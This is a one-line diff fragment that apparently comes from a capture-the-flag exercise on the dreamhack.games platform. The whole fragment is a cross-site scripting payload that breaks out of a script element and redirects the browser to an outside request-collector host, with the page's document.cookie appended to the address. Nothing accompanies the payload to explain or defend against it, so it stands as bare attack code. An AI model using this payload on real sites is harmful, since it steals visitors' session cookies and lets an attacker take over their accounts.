@@ -1,0 +1,1 @@
+<script id="name"></script>#location.href='https://ysctcqa.request.dreamhack.games/'+document.cookie;//
